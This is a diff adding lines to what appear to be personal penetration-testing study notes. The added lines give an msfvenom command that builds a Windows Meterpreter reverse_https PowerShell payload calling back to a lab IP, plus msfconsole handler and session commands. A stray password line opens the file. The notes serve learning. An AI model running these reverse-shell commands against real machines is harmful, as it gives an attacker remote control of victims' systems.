@@ -1,5 +1,22 @@
 password: @Hide01
 
+# generating payloads from meterpreter
+
+```s
+    msfvenom -p windows/x64/meterpreter/reverse_https -a x64 LHOST=10.10.138.10 LPORT=4443 EXITFUNC=thread -f ps1.
+```
+for starting reverse handler in msfconsole use
+```s
+    use exploit/multi/handler
+    set payload
+    set lhost
+    set lport
+    exploit
+```
+To send any session to background use bg
+  list sessions using 'sessions'
+  start interacting with a session using session number 'sessions 1'
+
 # chapter 3 Windows concepts
 
 1. WOW  - Windows on windows. Most windows mahine sise the 64 bit version of the Windows Operating system. However many applications are still 32 bit.
